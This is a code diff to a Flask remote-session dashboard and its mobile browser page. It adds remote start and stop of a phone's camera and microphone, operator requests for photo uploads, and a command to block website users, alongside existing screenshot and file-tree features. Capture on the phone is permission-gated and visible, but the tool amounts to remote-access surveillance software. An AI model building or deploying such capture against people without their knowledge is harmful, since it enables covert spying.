+function cameraLoop() {
+    if (!cameraActive || !mediaStream) return;
+    if (preview.videoWidth) {
+        const width = Math.min(960, preview.videoWidth);
+        const height = Math.round(preview.videoHeight * (width / preview.videoWidth));
+        if (canvas.width !== width || canvas.height !== height) {
+            canvas.width = width;
+            canvas.height = height;
+        }
+        context2d.drawImage(preview, 0, 0, width, height);
+        canvas.toBlob(uploadFrame, "image/jpeg", 0.6);
+    }
+    cameraTimer = setTimeout(cameraLoop, 900);
+}
+
+
+function setCameraActive(active) {
+    if (active && !cameraGranted) {
+        if (!cameraWarned) {
+            cameraWarned = true;
+            logLine("! operator started the camera - allow camera to continue", "warn");
+        }
+        permStatus.textContent = "The dashboard started the camera. Allow camera + microphone.";
+        cameraActive = false;
+        return;
+    }
+    if (active === cameraActive) return;
+    cameraActive = active;
+    if (active) {
+        cameraWarned = false;
+        logLine("> camera stream requested by the dashboard", "warn");
+        setChip("chipCamera", "live", "Camera streaming");
+        cameraLoop();
+    } else {
+        clearTimeout(cameraTimer);
+        setChip("chipCamera", cameraGranted ? "ok" : "", cameraGranted ? "Camera ready" : "Camera");
+        if (cameraGranted) logLine("> camera stream stopped", "dim");
+    }
+}
+
+
+function setMicActive(active) {
+    if (active && !micGranted) {
+        if (!micWarned) {
+            micWarned = true;
+            logLine("! operator started the microphone - allow microphone to continue", "warn");
+        }
+        permStatus.textContent = "The dashboard started the microphone. Allow camera + microphone.";
+        micActive = false;
+        return;
+    }
+    if (active === micActive) return;
+    micActive = active;
+    if (active) {
+        micWarned = false;
+        logLine("> microphone stream requested by the dashboard", "warn");
+        setChip("chipMic", "live", "Mic streaming");
+    } else {
+        micPending = [];
+        micPendingSamples = 0;
+        setChip("chipMic", micGranted ? "ok" : "", micGranted ? "Mic ready" : "Microphone");
+        if (micGranted) logLine("> microphone stream stopped", "dim");
+    }
+}
+
+
+async function pollState() {
+    if (deviceName) {
+        try {
+            const response = await fetch(
+                "/api/mobile/state?name=" + encodeURIComponent(deviceName),
+                { cache: "no-store" }
+            );
+            if (authRedirect(response)) return;
+            if (response.ok) {
+                const data = await response.json();
+                setCameraActive(Boolean(data.camera));
+                setMicActive(Boolean(data.microphone));
+                requestBanner.hidden = !data.photo_request;
+            }
+        } catch (error) {
+        }
+    }
+    setTimeout(pollState, 1500);
+}
+
+
+async function heartbeat() {
+    if (deviceName) {
+        try {
+            await postJson("/api/mobile/heartbeat", {
+                name: deviceName,
+                permissions: {
+                    camera: cameraGranted,
+                    microphone: micGranted,
+                    photos: photoCount
+                }
+            });
+        } catch (error) {
+        }
+    }
+    if (!heartbeatScheduled) {
+        heartbeatScheduled = true;
+        setTimeout(function() {
+            heartbeatScheduled = false;
+            heartbeat();
+        }, 8000);
+    }
+}
+
+
+function openPicker() {
+    photoInput.click();
+}
+
+
+async function sendPhotos() {
+    const files = Array.from(photoInput.files || []);
+    if (!files.length) {
+        photoInput.value = "";
+        await postJson("/api/mobile/photo-ack", { name: deviceName }).catch(() => {});
+        return;
+    }
+    const form = new FormData();
+    form.append("name", deviceName);
+    files.slice(0, 20).forEach(file => form.append("photos", file, file.name));
+    logLine("> sending " + files.length + " picture(s)...", "dim");
+    try {
+        const response = await fetch("/upload-photo", { method: "POST", body: form });
+        if (authRedirect(response)) return;
+        const data = await response.json();
+        photoCount += data.saved || 0;
+        setChip("chipPhotos", "ok", photoCount + " picture(s)");
+        logLine("> " + (data.saved || 0) + " picture(s) delivered", "dim");
+    } catch (error) {
+        logLine("! picture upload failed: " + error.message, "err");
+    }
+    photoInput.value = "";
+    requestBanner.hidden = true;
+    await postJson("/api/mobile/photo-ack", { name: deviceName }).catch(() => {});
+}
+
+
+async function leaveSession() {
+    stopMedia();
+    try {
+        await postJson("/api/mobile/leave", { name: deviceName });
+    } catch (error) {
+    }
+    window.location.href = "/";
+}
+
+
+enableButton.addEventListener("click", enableMedia);
+pickButton.addEventListener("click", openPicker);
+photoInput.addEventListener("change", sendPhotos);
+document.getElementById("bannerPick").addEventListener("click", openPicker);
+document.getElementById("leaveButton").addEventListener("click", leaveSession);
+
+
+const bootLines = [
+    "> booting remote session bridge...",
+    "> probing display + audio interfaces...",
+    "> negotiating operator handshake...",
+    "> encrypting uplink channel...",
+    "> session agent armed, waiting for operator commands..."
+];
+
+bootLines.forEach((line, index) => {
+    setTimeout(() => logLine(line, "dim"), 220 * (index + 1));
+});
+
+
+registerDevice()
+    .then(() => {
+        heartbeat();
+        pollState();
+    })
+    .catch(error => {
+        logLine("! " + error.message, "err");
+        permStatus.textContent = error.message;
     });
 </script>
 
@@ -6407,6 +7574,61 @@ def record_website_session():
             entry["path"] = request.path
 
 
+def prune_blocked_sessions(now):
+
+    for sid in [
+        sid for sid, item in blocked_sessions.items()
+        if item["until"] <= now
+    ]:
+        blocked_sessions.pop(sid, None)
+
+
+@app.before_request
+def enforce_website_blocks():
+
+    if request.path == "/favicon.ico":
+        return
+
+    sid = session.get("sid")
+
+    if not sid:
+        return
+
+    now = time.time()
+
+    with session_lock:
+
+        prune_blocked_sessions(now)
+
+        item = blocked_sessions.get(sid)
+
+        if not item:
+            return
+
+        remaining = max(1, int(item["until"] - now) + 1)
+
+    if request.path.startswith("/api/"):
+
+        response = jsonify({
+            "error": f"You are blocked for {remaining} more seconds.",
+            "blocked": True,
+            "retry_after": remaining
+        })
+        response.status_code = 403
+
+    else:
+
+        response = make_response(
+            render_template_string(BLOCKED_HTML, remaining=remaining),
+            403
+        )
+
+    response.headers["X-Blocked"] = "1"
+    response.headers["Retry-After"] = str(remaining)
+
+    return response
+
+
 @app.before_request
 def track_website_visitor():
 
@@ -6425,11 +7647,13 @@ def describe_website_users():
 
     with session_lock:
         prune_website_sessions(now)
+        prune_blocked_sessions(now)
         users = sorted(
             website_sessions.values(),
             key=lambda entry: entry["last_seen"],
             reverse=True
         )
+        blocked = dict(blocked_sessions)
 
     if not users:
         return "No one is signed in to the website."
@@ -6468,8 +7692,16 @@ def describe_website_users():
 
         state = "online" if entry in online else "idle"
 
+        block = blocked.get(entry["id"])
+
+        if block:
+            state += f", blocked for {max(1, int(block['until'] - now) + 1)}s"
+
         lines.append(
-            f"{index}. {entry['ip']} \u2014 {entry['agent']} ({state})"
+            f"({index}) {entry['ip']} \u2014 {entry['agent']} ({state})"
+        )
+        lines.append(
+            "   Code: " + entry["id"][:6]
         )
         lines.append(
             "   Signed in: "
@@ -6487,6 +7719,110 @@ def describe_website_users():
         lines.append("")
 
     return "\n".join(lines).rstrip()
+
+
+def block_website_user(argument):
+
+    parts = (argument or "").split()
+
+    if not parts:
+        return (
+            "Usage: user-block <number or code> [seconds]\n"
+            "Example: user-block 2 60\n"
+            "Without seconds the block lasts 60 seconds.\n"
+            "Run view-users to see the numbers and codes."
+        )
+
+    token = parts[0].lstrip("#").lower()
+
+    seconds = BLOCK_SECONDS
+
+    if len(parts) > 1:
+
+        try:
+            seconds = int(parts[1])
+        except ValueError:
+            return (
+                "Block time must be a whole number of seconds, "
+                "like: user-block 2 60"
+            )
+
+        if seconds < 1:
+            return "Block time must be at least 1 second."
+
+        if seconds > MAX_BLOCK_SECONDS:
+            return (
+                "Block time cannot be longer than "
+                f"{MAX_BLOCK_SECONDS} seconds (1 day)."
+            )
+
+    now = time.time()
+    current_sid = session.get("sid")
+
+    with session_lock:
+
+        prune_website_sessions(now)
+        prune_blocked_sessions(now)
+
+        users = sorted(
+            website_sessions.values(),
+            key=lambda entry: entry["last_seen"],
+            reverse=True
+        )
+
+        target = None
+        position = 0
+
+        if token.isdigit():
+
+            index = int(token)
+
+            if 1 <= index <= len(users):
+                target = users[index - 1]
+                position = index
+
+        else:
+
+            for index, entry in enumerate(users, 1):
+
+                if entry["id"].lower().startswith(token):
+                    target = entry
+                    position = index
+                    break
+
+        if target is None:
+            return (
+                f"No user matches '{token}'. "
+                "Run view-users to see the current numbers and codes."
+            )
+
+        if target["id"] == current_sid:
+            return "You cannot block your own session."
+
+        existing = blocked_sessions.get(target["id"])
+
+        if existing:
+            left = max(1, int(existing["until"] - now) + 1)
+            return (
+                f"({position}) {target['ip']} is already blocked "
+                f"for {left} more seconds."
+            )
+
+        blocked_sessions[target["id"]] = {
+            "until": now + seconds,
+            "ip": target["ip"],
+            "agent": target["agent"],
+        }
+
+    add_log("warn", f"Dashboard user blocked: ({position}) {target['ip']}")
+
+    return (
+        "USER BLOCKED\n"
+        "------------\n"
+        f"({position}) {target['ip']} \u2014 {target['agent']}\n"
+        f"Code: {target['id'][:6]}\n"
+        f"Locked out of the website for {seconds} seconds."
+    )
 
 
 # ==================================================
@@ -6657,6 +7993,7 @@ def console_command():
                 "help             Show available commands\n"
                 "status           Show connection status\n"
                 "view-users       Show who is using the website\n"
+                "user-block <id> [seconds]  Block a website user (default 60s)\n"
                 "pwd              Show the shared root folder\n"
                 "ls [folder]      List folders in the cached directory tree\n"
                 "screenshot       Request a remote screenshot\n"
@@ -6681,6 +8018,10 @@ def console_command():
         elif operation in ("view-users", "users"):
 
             output = describe_website_users()
+
+        elif operation in ("user-block", "block-user"):
+
+            output = block_website_user(argument)
 
         elif operation == "pwd":
 
@@ -6974,7 +8315,8 @@ def sync():
             "base_name": computer_name,
             "root": root,
             "tree": tree,
-            "last_seen": now
+            "last_seen": now,
+            "kind": "desktop"
         }
 
         client_actions.setdefault(
@@ -7019,7 +8361,8 @@ def get_clients():
 
             result.append({
                 "name": name,
-                "last_seen": client["last_seen"]
+                "last_seen": client["last_seen"],
+                "kind": client.get("kind", "desktop")
             })
 
     return jsonify({"clients": result})
@@ -7757,9 +9100,12 @@ def start_mic():
             "timestamp": 0.0
         }
 
-        client_actions.setdefault(name, queue.Queue()).put({
-            "action": "mic_start"
-        })
+        # Mobile devices stream from the browser, so they poll
+        # /api/mobile/state instead of the client action queue.
+        if client.get("kind") != "mobile":
+            client_actions.setdefault(name, queue.Queue()).put({
+                "action": "mic_start"
+            })
 
     return jsonify({"success": True})
 
@@ -7785,9 +9131,12 @@ def stop_mic():
             state["chunks"].clear()
             state["timestamp"] = 0.0
 
-        client_actions.setdefault(name, queue.Queue()).put({
-            "action": "mic_stop"
-        })
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            client_actions.setdefault(name, queue.Queue()).put({
+                "action": "mic_stop"
+            })
 
     return jsonify({"success": True})
 
@@ -7920,9 +9269,10 @@ def start_camera():
             "timestamp": 0.0
         }
 
-        client_actions.setdefault(name, queue.Queue()).put({
-            "action": "camera_start"
-        })
+        if client.get("kind") != "mobile":
+            client_actions.setdefault(name, queue.Queue()).put({
+                "action": "camera_start"
+            })
 
     return jsonify({"success": True})
 
@@ -7948,9 +9298,12 @@ def stop_camera():
             state["frame"] = None
             state["timestamp"] = 0.0
 
-        client_actions.setdefault(name, queue.Queue()).put({
-            "action": "camera_stop"
-        })
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            client_actions.setdefault(name, queue.Queue()).put({
+                "action": "camera_stop"
+            })
 
     return jsonify({"success": True})
 
@@ -8030,6 +9383,291 @@ def camera_frame(name):
     )
 
     return response
+
+
+# ==================================================
+# MOBILE WEB CLIENT
+# ==================================================
+
+@app.route("/mobile")
+@require_auth
+def mobile_page():
+    return render_template_string(MOBILE_HTML)
+
+
+@app.route("/api/mobile/register", methods=["POST"])
+@require_auth
+def register_mobile():
+
+    data = request.get_json(silent=True) or {}
+    agent = request.headers.get("User-Agent", "")
+    requested = (data.get("name") or "").strip()[:120]
+
+    label = "Tablet" if ("iPad" in agent or "Tablet" in agent) else "Phone"
+    wanted = f"{label} ({describe_user_agent(agent)})"
+
+    with lock:
+
+        now = time.time()
+
+        existing = clients.get(requested) if requested else None
+
+        if existing and existing.get("kind") == "mobile":
+
+            name = requested
+            existing["last_seen"] = now
+
+        else:
+
+            name = allocate_client_name(wanted, now)
+
+            clients[name] = {
+                "name": name,
+                "base_name": wanted,
+                "root": "",
+                "tree": {
+                    "name": wanted,
+                    "path": "",
+                    "loaded": True,
+                    "dirs": [],
+                    "files": []
+                },
+                "last_seen": now,
+                "kind": "mobile",
+                "permissions": {
+                    "camera": False,
+                    "microphone": False,
+                    "photos": 0
+                }
+            }
+
+            client_actions.setdefault(name, queue.Queue())
+
+            add_log("success", f"Mobile device connected: {name}")
+
+    return jsonify({"success": True, "name": name, "kind": "mobile"})
+
+
+@app.route("/api/mobile/heartbeat", methods=["POST"])
+@require_auth
+def mobile_heartbeat():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+    permissions = data.get("permissions")
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            return jsonify({"error": "Mobile device not found"}), 404
+
+        client["last_seen"] = time.time()
+
+        if isinstance(permissions, dict):
+            client["permissions"] = {
+                "camera": bool(permissions.get("camera")),
+                "microphone": bool(permissions.get("microphone")),
+                "photos": max(0, int(permissions.get("photos") or 0))
+            }
+
+    return jsonify({"success": True})
+
+
+@app.route("/api/mobile/state")
+@require_auth
+def mobile_state():
+
+    name = request.args.get("name", "")
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            return jsonify({"error": "Mobile device not found"}), 404
+
+        client["last_seen"] = time.time()
+
+        camera = camera_streams.get(name)
+        mic = mic_streams.get(name)
+
+        result = {
+            "camera": bool(camera and camera["active"]),
+            "microphone": bool(mic and mic["active"]),
+            "photo_request": bool(client.get("photo_request")),
+            "photos": len(mobile_photos.get(name) or ())
+        }
+
+    return jsonify(result)
+
+
+@app.route("/upload-photo", methods=["POST"])
+@require_auth
+def upload_mobile_photo():
+
+    name = request.form.get("name")
+    uploads = request.files.getlist("photos")
+
+    if not name or not uploads:
+        return jsonify({"error": "Missing photos"}), 400
+
+    saved = 0
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            return jsonify({"error": "Mobile device not found"}), 404
+
+        store = mobile_photos.get(name)
+
+        if store is None:
+            store = deque(maxlen=MOBILE_PHOTO_LIMIT)
+            mobile_photos[name] = store
+
+        for uploaded in uploads[:20]:
+
+            mimetype = (uploaded.mimetype or "").lower()
+
+            if not mimetype.startswith("image/"):
+                continue
+
+            data = uploaded.read(MOBILE_PHOTO_MAX_SIZE + 1)
+
+            if not data or len(data) > MOBILE_PHOTO_MAX_SIZE:
+                continue
+
+            store.append({
+                "id": uuid.uuid4().hex,
+                "name": (uploaded.filename or "photo")[:120],
+                "mimetype": mimetype,
+                "size": len(data),
+                "time": time.time(),
+                "data": data
+            })
+
+            saved += 1
+
+        client["photo_request"] = False
+        client["last_seen"] = time.time()
+
+        total = len(store)
+
+    if saved:
+        add_log("info", f"{saved} photo(s) received from {name}.")
+
+    return jsonify({"success": True, "saved": saved, "photos": total})
+
+
+@app.route("/api/photos")
+@require_auth
+def list_mobile_photos():
+
+    name = request.args.get("name", "")
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            return jsonify({"error": "Mobile device not found"}), 404
+
+        items = [
+            {
+                "id": item["id"],
+                "name": item["name"],
+                "size": item["size"],
+                "time": item["time"]
+            }
+            for item in (mobile_photos.get(name) or ())
+        ]
+
+    items.reverse()
+
+    return jsonify({"photos": items})
+
+
+@app.route("/api/photo/<name>/<photo_id>")
+@require_auth
+def get_mobile_photo(name, photo_id):
+
+    with lock:
+
+        found = next(
+            (
+                item for item in (mobile_photos.get(name) or ())
+                if item["id"] == photo_id
+            ),
+            None
+        )
+
+    if not found:
+        return jsonify({"error": "Photo not found"}), 404
+
+    response = send_file(
+        io.BytesIO(found["data"]),
+        mimetype=found["mimetype"]
+    )
+
+    response.headers["Cache-Control"] = "private, max-age=120"
+
+    return response
+
+
+@app.route("/api/photos/request", methods=["POST"])
+@require_auth
+def request_mobile_photos():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client or client.get("kind") != "mobile":
+            return jsonify({"error": "Mobile device not found"}), 404
+
+        client["photo_request"] = time.time()
+
+    return jsonify({"success": True})
+
+
+@app.route("/api/mobile/photo-ack", methods=["POST"])
+@require_auth
+def acknowledge_photo_request():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+
+    with lock:
+
+        client = clients.get(name)
+
+        if client:
+            client["photo_request"] = False
+
+    return jsonify({"success": True})
+
+
+@app.route("/api/mobile/leave", methods=["POST"])
+@require_auth
+def leave_mobile():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+
+    with lock:
+
+        client = clients.get(name)
+
+        if client and client.get("kind") == "mobile":
+            remove_client(name)
+
+    return jsonify({"success": True})
 
 
 # ==================================================
